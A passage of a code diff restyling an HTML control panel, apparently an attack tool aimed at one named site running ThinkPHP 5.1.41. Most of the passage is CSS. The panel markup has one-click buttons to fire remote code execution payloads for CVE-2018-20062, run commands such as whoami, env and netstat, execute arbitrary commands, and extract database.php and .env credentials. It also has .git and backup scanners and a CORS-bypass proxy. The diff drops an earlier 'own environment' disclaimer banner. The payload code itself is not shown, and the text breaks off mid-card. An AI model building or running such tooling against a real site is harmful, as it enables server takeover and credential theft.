@@ -3,507 +3,1316 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔬 GoldMedal.cc - Ethical Hacking Lab</title>
+    <title>🔬 GoldMedal.cc | VIP Security Testing Suite</title>
     <style>
         :root {
-            --bg: #0a0e14;
-            --card: #131820;
+            --bg-primary: #0a0e14;
+            --bg-secondary: #131820;
+            --bg-tertiary: #1a1f2e;
             --border: #1e2733;
-            --text: #c9d1d9;
-            --accent: #58a6ff;
-            --red: #f85149;
-            --green: #3fb950;
-            --orange: #f0883e;
-            --purple: #a371f7;
-            --yellow: #d2991d;
+            --border-active: #30363d;
+            --text-primary: #e6edf3;
+            --text-secondary: #8b949e;
+            --text-muted: #6e7681;
+            --accent-blue: #58a6ff;
+            --accent-green: #3fb950;
+            --accent-red: #f85149;
+            --accent-orange: #f0883e;
+            --accent-purple: #a371f7;
+            --accent-yellow: #d2991d;
+            --accent-cyan: #39d2c0;
+            --accent-pink: #f778ba;
+            --gradient-1: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-2: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --gradient-3: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            --gradient-4: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.3);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.4);
+            --shadow-lg: 0 8px 24px rgba(0,0,0,0.5);
+            --shadow-glow-blue: 0 0 20px rgba(88,166,255,0.15);
+            --shadow-glow-red: 0 0 20px rgba(248,81,73,0.15);
+            --shadow-glow-purple: 0 0 20px rgba(163,113,247,0.15);
+            --radius-sm: 6px;
+            --radius-md: 10px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+            --transition-fast: 0.15s ease;
+            --transition-normal: 0.25s ease;
+            --transition-slow: 0.4s ease;
         }
         
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            padding: 16px;
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
             min-height: 100vh;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
         
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-            padding: 20px;
-            background: linear-gradient(135deg, #131820 0%, #1a1f2e 100%);
-            border: 1px solid var(--border);
-            border-radius: 12px;
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--border-active); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #444; }
+        
+        /* Top Navigation Bar */
+        .navbar {
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border);
+            padding: 0 24px;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
         }
         
-        .header h1 {
-            color: var(--accent);
-            font-size: 1.8em;
-            margin-bottom: 8px;
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
         
-        .header .badge {
-            display: inline-block;
-            background: #238636;
-            color: #fff;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.75em;
-            font-weight: 600;
-            margin: 4px;
+        .nav-logo {
+            width: 36px;
+            height: 36px;
+            background: var(--gradient-1);
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
         }
         
-        .header .badge.warning {
-            background: #9e6a03;
+        .nav-title {
+            font-size: 1.2em;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
         
-        .subtitle {
-            color: #8b949e;
-            font-size: 0.85em;
-            margin-top: 8px;
+        .nav-subtitle {
+            font-size: 0.7em;
+            color: var(--text-muted);
+            margin-top: -2px;
         }
         
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+        .nav-status {
+            display: flex;
+            align-items: center;
             gap: 16px;
         }
         
-        .card {
-            background: var(--card);
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            background: var(--bg-tertiary);
+            border-radius: 20px;
+            font-size: 0.75em;
+            font-weight: 500;
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        .status-dot.online { background: var(--accent-green); box-shadow: 0 0 8px rgba(63,185,80,0.5); }
+        .status-dot.offline { background: var(--accent-red); box-shadow: 0 0 8px rgba(248,81,73,0.5); }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Main Container */
+        .main-container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 24px;
+        }
+        
+        /* Quick Stats Row */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .stat-card {
+            background: var(--bg-secondary);
             border: 1px solid var(--border);
-            border-radius: 10px;
-            padding: 16px;
-            transition: all 0.3s ease;
+            border-radius: var(--radius-md);
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+            transition: all var(--transition-normal);
+            cursor: default;
         }
         
-        .card:hover {
-            border-color: #30363d;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        .stat-card:hover {
+            border-color: var(--border-active);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-md);
         }
         
-        .card.danger-card {
-            border-left: 3px solid var(--red);
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--gradient-1);
+            opacity: 0;
+            transition: opacity var(--transition-normal);
         }
         
-        .card.warning-card {
-            border-left: 3px solid var(--orange);
+        .stat-card:hover::before { opacity: 1; }
+        
+        .stat-icon {
+            font-size: 2em;
+            margin-bottom: 8px;
         }
         
-        .card.info-card {
-            border-left: 3px solid var(--accent);
+        .stat-value {
+            font-size: 2em;
+            font-weight: 800;
+            letter-spacing: -1px;
+            margin-bottom: 4px;
         }
         
-        .card.purple-card {
-            border-left: 3px solid var(--purple);
+        .stat-value.danger { color: var(--accent-red); }
+        .stat-value.warning { color: var(--accent-orange); }
+        .stat-value.success { color: var(--accent-green); }
+        .stat-value.info { color: var(--accent-blue); }
+        .stat-value.purple { color: var(--accent-purple); }
+        
+        .stat-label {
+            font-size: 0.75em;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
         }
         
-        .card h2 {
-            font-size: 1em;
-            margin-bottom: 12px;
+        /* Tabs Navigation */
+        .tabs-nav {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 20px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            padding: 4px;
+            overflow-x: auto;
+            flex-wrap: wrap;
+        }
+        
+        .tab-btn {
+            padding: 10px 20px;
+            border: none;
+            background: transparent;
+            color: var(--text-secondary);
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            font-size: 0.85em;
+            font-weight: 500;
+            transition: all var(--transition-fast);
+            white-space: nowrap;
+            font-family: inherit;
             display: flex;
             align-items: center;
             gap: 8px;
         }
         
-        .card h2 .icon {
-            font-size: 1.3em;
+        .tab-btn:hover {
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
         }
         
-        input, textarea, select, button {
-            width: 100%;
-            padding: 10px 12px;
-            margin: 6px 0;
-            background: #0d1117;
+        .tab-btn.active {
+            background: var(--accent-blue);
+            color: #fff;
+            font-weight: 600;
+            box-shadow: var(--shadow-glow-blue);
+        }
+        
+        .tab-btn.danger.active { background: var(--accent-red); box-shadow: var(--shadow-glow-red); }
+        .tab-btn.warning.active { background: var(--accent-orange); }
+        .tab-btn.purple.active { background: var(--accent-purple); box-shadow: var(--shadow-glow-purple); }
+        
+        .tab-badge {
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 0.7em;
+            font-weight: 700;
+            background: rgba(255,255,255,0.2);
+        }
+        
+        /* Tab Content */
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Grid Layout for Cards */
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 16px;
+        }
+        
+        .tools-grid.single-col { grid-template-columns: 1fr; }
+        
+        /* Tool Cards */
+        .tool-card {
+            background: var(--bg-secondary);
             border: 1px solid var(--border);
-            border-radius: 6px;
-            color: var(--text);
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            transition: all var(--transition-normal);
+        }
+        
+        .tool-card:hover {
+            border-color: var(--border-active);
+            box-shadow: var(--shadow-md);
+        }
+        
+        .tool-card.danger-card { border-left: 3px solid var(--accent-red); }
+        .tool-card.warning-card { border-left: 3px solid var(--accent-orange); }
+        .tool-card.info-card { border-left: 3px solid var(--accent-blue); }
+        .tool-card.purple-card { border-left: 3px solid var(--accent-purple); }
+        .tool-card.success-card { border-left: 3px solid var(--accent-green); }
+        .tool-card.cyan-card { border-left: 3px solid var(--accent-cyan); }
+        
+        .tool-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+        
+        .tool-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1em;
+            font-weight: 600;
+        }
+        
+        .tool-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.1em;
+            flex-shrink: 0;
+        }
+        
+        .tool-icon.blue { background: rgba(88,166,255,0.15); color: var(--accent-blue); }
+        .tool-icon.red { background: rgba(248,81,73,0.15); color: var(--accent-red); }
+        .tool-icon.orange { background: rgba(240,136,62,0.15); color: var(--accent-orange); }
+        .tool-icon.purple { background: rgba(163,113,247,0.15); color: var(--accent-purple); }
+        .tool-icon.green { background: rgba(63,185,80,0.15); color: var(--accent-green); }
+        .tool-icon.cyan { background: rgba(57,210,192,0.15); color: var(--accent-cyan); }
+        
+        .tool-actions {
+            display: flex;
+            gap: 6px;
+        }
+        
+        .tool-body {
+            padding: 16px 20px;
+        }
+        
+        .tool-desc {
+            font-size: 0.78em;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+            line-height: 1.6;
+        }
+        
+        .tool-desc code {
+            background: var(--bg-tertiary);
+            padding: 2px 6px;
+            border-radius: 3px;
             font-size: 0.9em;
-            font-family: inherit;
-            transition: border-color 0.2s;
+            color: var(--accent-orange);
+        }
+        
+        /* Form Elements */
+        .input-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        
+        .input-group.vertical { flex-direction: column; }
+        
+        input, textarea, select {
+            width: 100%;
+            padding: 10px 14px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-size: 0.85em;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+            transition: all var(--transition-fast);
         }
         
         input:focus, textarea:focus, select:focus {
             outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(88,166,255,0.1);
         }
         
+        textarea {
+            min-height: 80px;
+            resize: vertical;
+            font-size: 0.75em;
+        }
+        
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%238b949e' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10l-5 5z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 36px;
+        }
+        
+        /* Buttons */
         button {
-            background: #238636;
-            border: 1px solid rgba(240, 246, 252, 0.1);
+            padding: 10px 18px;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-size: 0.85em;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        button:hover {
-            background: #2ea043;
-            transform: translateY(-1px);
-        }
-        
-        button:active {
-            transform: translateY(0);
-        }
-        
-        button.danger {
-            background: #da3633;
-        }
-        
-        button.danger:hover {
-            background: #f85149;
-        }
-        
-        button.warning {
-            background: #9e6a03;
-        }
-        
-        button.warning:hover {
-            background: #bb8009;
-        }
-        
-        button.purple {
-            background: #6e40c9;
-        }
-        
-        button.purple:hover {
-            background: #7c4dff;
-        }
-        
-        .flex-row {
-            display: flex;
+            transition: all var(--transition-fast);
+            font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
             gap: 8px;
+            white-space: nowrap;
         }
         
-        .flex-row > * {
-            flex: 1;
-        }
+        button:active { transform: scale(0.97); }
         
-        .output {
-            background: #000;
-            color: #3fb950;
-            padding: 12px;
-            border-radius: 6px;
-            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
-            font-size: 0.7em;
-            max-height: 350px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-break: break-all;
-            margin-top: 10px;
-            border: 1px solid #1a3a1a;
-            line-height: 1.5;
-        }
-        
-        .output.error {
-            color: #f85149;
-            border-color: #3a1a1a;
-        }
-        
-        .output.loading {
-            color: #d2991d;
-            border-color: #3a3a1a;
-        }
-        
-        .tag {
-            display: inline-block;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 0.7em;
-            font-weight: 600;
-            margin: 2px;
-        }
-        
-        .tag.found {
-            background: #238636;
+        .btn-primary {
+            background: var(--accent-blue);
             color: #fff;
         }
-        
-        .tag.not-found {
-            background: #30363d;
-            color: #8b949e;
+        .btn-primary:hover {
+            background: #4090e0;
+            box-shadow: var(--shadow-glow-blue);
         }
         
-        .tag.critical {
-            background: #da3633;
+        .btn-danger {
+            background: var(--accent-red);
             color: #fff;
         }
+        .btn-danger:hover {
+            background: #d93a3a;
+            box-shadow: var(--shadow-glow-red);
+        }
         
-        .stats {
+        .btn-warning {
+            background: var(--accent-orange);
+            color: #fff;
+        }
+        .btn-warning:hover { background: #d97a30; }
+        
+        .btn-purple {
+            background: var(--accent-purple);
+            color: #fff;
+        }
+        .btn-purple:hover {
+            background: #8b5cf6;
+            box-shadow: var(--shadow-glow-purple);
+        }
+        
+        .btn-success {
+            background: var(--accent-green);
+            color: #fff;
+        }
+        .btn-success:hover { background: #2da040; }
+        
+        .btn-ghost {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+        }
+        .btn-ghost:hover {
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+            border-color: var(--border-active);
+        }
+        
+        .btn-sm {
+            padding: 6px 12px;
+            font-size: 0.75em;
+        }
+        
+        .btn-group {
             display: flex;
             gap: 8px;
             flex-wrap: wrap;
+        }
+        
+        /* Output Area */
+        .output-area {
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 14px;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+            font-size: 0.72em;
+            line-height: 1.5;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: var(--accent-green);
+            margin-top: 10px;
+            min-height: 60px;
+            position: relative;
+        }
+        
+        .output-area.loading {
+            color: var(--accent-yellow);
+            border-color: rgba(210,153,29,0.3);
+        }
+        
+        .output-area.error {
+            color: var(--accent-red);
+            border-color: rgba(248,81,73,0.3);
+        }
+        
+        .output-area .line-number {
+            color: var(--text-muted);
+            margin-right: 8px;
+            user-select: none;
+        }
+        
+        .output-toolbar {
+            display: flex;
+            justify-content: flex-end;
+            gap: 6px;
+            margin-top: 8px;
+        }
+        
+        /* Tags & Badges */
+        .tag {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 0.7em;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        
+        .tag.critical { background: rgba(248,81,73,0.2); color: var(--accent-red); }
+        .tag.high { background: rgba(240,136,62,0.2); color: var(--accent-orange); }
+        .tag.medium { background: rgba(210,153,29,0.2); color: var(--accent-yellow); }
+        .tag.low { background: rgba(88,166,255,0.2); color: var(--accent-blue); }
+        .tag.info { background: rgba(139,148,158,0.2); color: var(--text-secondary); }
+        .tag.success { background: rgba(63,185,80,0.2); color: var(--accent-green); }
+        
+        /* Findings Log */
+        .findings-container {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            overflow: hidden;
+        }
+        
+        .findings-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .findings-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .finding-item {
+            padding: 10px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 0.8em;
+            transition: background var(--transition-fast);
+        }
+        
+        .finding-item:hover { background: var(--bg-tertiary); }
+        
+        .finding-time {
+            color: var(--text-muted);
+            font-size: 0.75em;
+            white-space: nowrap;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .finding-severity { flex-shrink: 0; }
+        
+        .finding-message { flex: 1; }
+        
+        /* Progress Bar */
+        .progress-bar {
+            height: 4px;
+            background: var(--bg-tertiary);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient-1);
+            border-radius: 2px;
+            transition: width 0.3s ease;
+            animation: shimmer 2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        
+        /* Toast Notifications */
+        .toast-container {
+            position: fixed;
+            top: 80px;
+            right: 24px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        
+        .toast {
+            padding: 12px 20px;
+            border-radius: var(--radius-sm);
+            font-size: 0.85em;
+            font-weight: 500;
+            animation: slideIn 0.3s ease;
+            box-shadow: var(--shadow-lg);
+            max-width: 400px;
+        }
+        
+        .toast.success { background: #1a3a2a; border: 1px solid var(--accent-green); color: var(--accent-green); }
+        .toast.error { background: #3a1a1a; border: 1px solid var(--accent-red); color: var(--accent-red); }
+        .toast.info { background: #1a2a3a; border: 1px solid var(--accent-blue); color: var(--accent-blue); }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.2s ease;
+        }
+        
+        .modal {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+            max-width: 800px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 16px;
         }
         
-        .stat-box {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px;
-            text-align: center;
-            flex: 1;
-            min-width: 80px;
-        }
-        
-        .stat-box .number {
+        .modal-close {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
             font-size: 1.5em;
-            font-weight: 700;
-            color: var(--accent);
+            cursor: pointer;
+            padding: 4px 8px;
         }
         
-        .stat-box .label {
-            font-size: 0.7em;
-            color: #8b949e;
-            margin-top: 4px;
+        /* Loading Spinner */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border);
+            border-top-color: var(--accent-blue);
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            display: inline-block;
         }
         
-        pre {
-            margin: 0;
-            white-space: pre-wrap;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
         
-        ::-webkit-scrollbar {
-            width: 6px;
+        /* Responsive */
+        @media (max-width: 768px) {
+            .tools-grid { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .navbar { padding: 0 16px; }
+            .main-container { padding: 16px; }
+            .nav-title { font-size: 1em; }
+            .stat-value { font-size: 1.5em; }
+            .tab-btn { padding: 8px 14px; font-size: 0.8em; }
+            .input-group { flex-direction: column; }
         }
         
-        ::-webkit-scrollbar-track {
-            background: #0d1117;
+        @media (max-width: 480px) {
+            .stats-grid { grid-template-columns: 1fr; }
+            .btn-group { flex-direction: column; }
+            button { width: 100%; }
         }
         
-        ::-webkit-scrollbar-thumb {
-            background: #30363d;
-            border-radius: 3px;
-        }
-        
-        ::-webkit-scrollbar-thumb:hover {
-            background: #444;
-        }
-        
-        @media (max-width: 600px) {
-            .grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .flex-row {
-                flex-direction: column;
-            }
-            
-            .header h1 {
-                font-size: 1.3em;
-            }
-            
-            body {
-                padding: 8px;
-            }
+        /* Print styles */
+        @media print {
+            .navbar, .tabs-nav, .btn-group, button { display: none; }
+            .output-area { border: 1px solid #ccc; color: #000; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Header -->
-    <div class="header">
-        <h1>🔬 GoldMedal.cc Test Panel</h1>
-        <span class="badge">ThinkPHP 5.1.41</span>
-        <span class="badge">nginx/1.20.1</span>
-        <span class="badge warning">Debug Mode ON</span>
-        <span class="badge warning">BT Panel Detected</span>
-        <p class="subtitle">⚠️ Ethical Testing Only — Own Environment — goldmedal.cc</p>
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="nav-brand">
+            <div class="nav-logo">🔬</div>
+            <div>
+                <div class="nav-title">GoldMedal.cc Security Suite</div>
+                <div class="nav-subtitle">Ethical Hacking & Penetration Testing</div>
+            </div>
+        </div>
+        <div class="nav-status">
+            <div class="status-indicator">
+                <div class="status-dot online" id="serverStatusDot"></div>
+                <span id="serverStatusText">Checking...</span>
+            </div>
+            <div class="status-indicator">
+                <span>🛡️</span>
+                <span>v2.0 VIP</span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- MAIN CONTAINER -->
+    <div class="main-container">
+
+        <!-- STATS -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon">🎯</div>
+                <div class="stat-value info" id="totalEndpoints">0</div>
+                <div class="stat-label">Endpoints Discovered</div>
+                <div class="progress-bar"><div class="progress-fill" style="width: 0%" id="endpointProgress"></div></div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">🔥</div>
+                <div class="stat-value danger" id="criticalFindings">0</div>
+                <div class="stat-label">Critical Findings</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">🔌</div>
+                <div class="stat-value warning" id="openPorts">0</div>
+                <div class="stat-label">Open Ports</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">🍪</div>
+                <div class="stat-value purple" id="cookieTests">0</div>
+                <div class="stat-label">Cookie Variations Tested</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">💣</div>
+                <div class="stat-value danger" id="rceAttempts">0</div>
+                <div class="stat-label">RCE Payloads Fired</div>
+            </div>
+        </div>
+
+        <!-- TABS -->
+        <div class="tabs-nav" id="tabsNav">
+            <button class="tab-btn active" data-tab="tab-rce">
+                ☠️ RCE & Exploits
+                <span class="tab-badge">Critical</span>
+            </button>
+            <button class="tab-btn danger" data-tab="tab-config">
+                🗄️ Config & DB Leak
+            </button>
+            <button class="tab-btn warning" data-tab="tab-discovery">
+                🔍 Discovery & Fuzzing
+            </button>
+            <button class="tab-btn purple" data-tab="tab-auth">
+                🔐 Auth & Cookies
+            </button>
+            <button class="tab-btn" data-tab="tab-recon">
+                🌐 Recon & Headers
+            </button>
+            <button class="tab-btn" data-tab="tab-vue">
+                🎯 Vue.js Analysis
+            </button>
+            <button class="tab-btn" data-tab="tab-findings">
+                📋 Findings Log
+            </button>
+        </div>
+
+        <!-- TAB: RCE & EXPLOITS -->
+        <div class="tab-content active" id="tab-rce">
+            <div class="tools-grid">
+                <!-- RCE Payloads -->
+                <div class="tool-card danger-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon red">☠️</div>
+                            <span>RCE Payload Arsenal</span>
+                        </div>
+                        <span class="tag critical">CVE-2018-20062</span>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Fire all known ThinkPHP 5.1.41 RCE payloads. Detects <code>phpinfo()</code>, command execution, and file read.</p>
+                        <button class="btn-danger" onclick="huntRCE()">
+                            💣 Fire All RCE Payloads
+                        </button>
+                        <div class="btn-group" style="margin-top: 8px;">
+                            <button class="btn-danger btn-sm" onclick="quickRCE('phpinfo')">🔍 PHP Info</button>
+                            <button class="btn-danger btn-sm" onclick="quickRCE('whoami')">👤 Whoami</button>
+                            <button class="btn-danger btn-sm" onclick="quickRCE('id')">🆔 ID</button>
+                            <button class="btn-danger btn-sm" onclick="quickRCE('ls')">📂 List Files</button>
+                            <button class="btn-danger btn-sm" onclick="quickRCE('env')">🌍 Environment</button>
+                            <button class="btn-danger btn-sm" onclick="quickRCE('netstat')">🔌 Netstat</button>
+                        </div>
+                        <div class="output-area" id="rceHuntOutput">Ready to fire RCE payloads...</div>
+                    </div>
+                </div>
+
+                <!-- Custom RCE -->
+                <div class="tool-card danger-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon red">💀</div>
+                            <span>Custom Command Execution</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Execute arbitrary system commands if RCE is confirmed.</p>
+                        <div class="input-group">
+                            <input type="text" id="customCmd" value="whoami" placeholder="Enter system command...">
+                            <button class="btn-danger" onclick="customRCE()">⚡ Execute</button>
+                        </div>
+                        <div class="output-area" id="customRCEOutput">Enter a command and execute...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB: CONFIG & DB LEAK -->
+        <div class="tab-content" id="tab-config">
+            <div class="tools-grid">
+                <!-- Database Config Leak -->
+                <div class="tool-card warning-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon orange">🗄️</div>
+                            <span>ThinkPHP Config Extraction</span>
+                        </div>
+                        <span class="tag high">Database Credentials</span>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Attempt to extract <code>database.php</code>, <code>.env</code>, and other sensitive config files.</p>
+                        <button class="btn-warning" onclick="huntDB()">
+                            🔓 Extract All Configs
+                        </button>
+                        <div class="output-area" id="dbOutput">Click to attempt config extraction...</div>
+                    </div>
+                </div>
+
+                <!-- .git Leak -->
+                <div class="tool-card warning-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon orange">📂</div>
+                            <span>.git Repository Exposure</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Check if <code>.git</code> directory is publicly accessible. Can reveal source code and commit history.</p>
+                        <button class="btn-warning" onclick="huntGit()">🔍 Scan .git Directory</button>
+                        <div class="output-area" id="gitOutput">Results will appear here...</div>
+                    </div>
+                </div>
+
+                <!-- Backup Files -->
+                <div class="tool-card warning-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon orange">📦</div>
+                            <span>Backup & Sensitive File Discovery</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Search for exposed backup archives, SQL dumps, config files, and other sensitive files.</p>
+                        <button class="btn-warning" onclick="huntBackups()">📥 Scan for Backup Files</button>
+                        <div class="output-area" id="backupOutput">Results will appear here...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB: DISCOVERY & FUZZING -->
+        <div class="tab-content" id="tab-discovery">
+            <div class="tools-grid">
+                <!-- Request Proxy -->
+                <div class="tool-card info-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon blue">🌐</div>
+                            <span>Request Proxy (CORS Bypass)</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Send requests through backend to bypass CORS restrictions.</p>
+                        <div class="input-group">
+                            <input type="text" id="proxyPath" value="/index.php" placeholder="Path">
+                            <select id="proxyMethod">
+                                <option>GET</option>
+                                <option>POST</option>
+                                <option>PUT</option>
+                                <option>DELETE</option>
+                                <option>PATCH</option>
+                            </select>
+                        </div>
+                        <input type="text" id="proxyCookie" placeholder="Cookie value (auto base64)" style="margin-bottom:8px;">
+                        <textarea id="proxyPostData" placeholder="POST/PUT data (JSON format)..." style="margin-bottom:8px;"></textarea>
+                        <button class="btn-primary" onclick="sendProxy()">🚀 Send Request</button>
+                        <div class="output-area" id="proxyOutput">Ready to proxy requests...</div>
+                    </div>
+                </div>
+
+                <!-- API Fuzzing -->
+                <div class="tool-card info-card">
